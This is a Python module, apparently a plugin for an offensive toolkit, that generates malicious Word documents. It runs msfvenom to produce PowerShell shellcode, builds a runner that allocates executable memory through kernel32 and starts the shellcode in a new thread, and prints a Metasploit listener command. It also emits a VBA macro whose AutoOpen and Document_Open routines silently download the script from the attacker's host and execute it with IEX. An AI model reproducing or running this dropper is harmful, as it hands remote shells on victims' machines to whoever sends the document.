import subprocess
import re
import os
import shutil
from colorama import Fore, Style

metadata = {
    "name": "PS1MacroRunner",
    "description": "Generates a PowerShell shellcode runner and a Word macro that downloads and executes it.",
    "parameters": ["payload", "lhost", "lport"]
}

def extract_ps1_shellcode(shellcode_output):
    match = re.search(r'\[Byte\[\]\] \$buf = (.*)', shellcode_output, re.DOTALL)
    return match.group(1).strip() if match else None

def prompt_for_shellcode():
    print(Fore.YELLOW + "    Type 'EOF' on a new line to finish." + Style.RESET_ALL)
    user_input = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        if line.strip().upper() == "EOF":
            break
        user_input.append(line)
    return "\n".join(user_input)

def build_ps1_script(shellcode):
    return f"""[Byte[]] $buf = {shellcode}

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
        uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
        UInt32 dwMilliseconds);
}}
"@

Add-Type $Kernel32

$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
"""

def generate_macro_code(params):
    payload = params.get("payload")
    lhost = params.get("lhost")
    lport = params.get("lport")
    output = params.get("output", "payload.docm")  # fallback just in case

    if not payload or not lhost or not lport:
        raise ValueError("Missing required parameters: --payload, --lhost, --lport")

    base_name = os.path.splitext(output)[0]
    ps1_name = f"{base_name}.ps1"

    cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "EXITFUNC=thread", "-f", "ps1"]

    try:
        if not shutil.which("msfvenom"):
            print(Fore.RED + "[!] msfvenom not found on this system.\n" + Style.RESET_ALL)
            print(Fore.CYAN + "[*] Run the following command on a machine with Metasploit installed:\n")

            suggested_cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -f ps1"
            print(Fore.YELLOW + f"    {suggested_cmd}\n")

            listener_cmd = f'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j"'
            print(Fore.GREEN + "[*] Start the Metasploit listener with:\n")
            print(Fore.YELLOW + f"    {listener_cmd}\n")

            print(Fore.CYAN + "[*] After executing it, paste the full output below.")
            shellcode_input = prompt_for_shellcode()
            shellcode = extract_ps1_shellcode(shellcode_input)
            if not shellcode:
                raise ValueError("Could not extract shellcode from pasted input.")
        else:
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                raise RuntimeError("msfvenom failed:\n" + result.stderr)

            shellcode = extract_ps1_shellcode(result.stdout)
            if not shellcode:
                raise ValueError("Could not extract shellcode from msfvenom output.")

        with open(ps1_name, "w") as f:
            f.write(build_ps1_script(shellcode))

    except Exception as e:
        return f"{Fore.RED}Error: {e}{Style.RESET_ALL}"

    macro = f'''
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://{lhost}/{ps1_name}') | IEX"
    Shell str, vbHide
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub
'''.strip()

    return macro
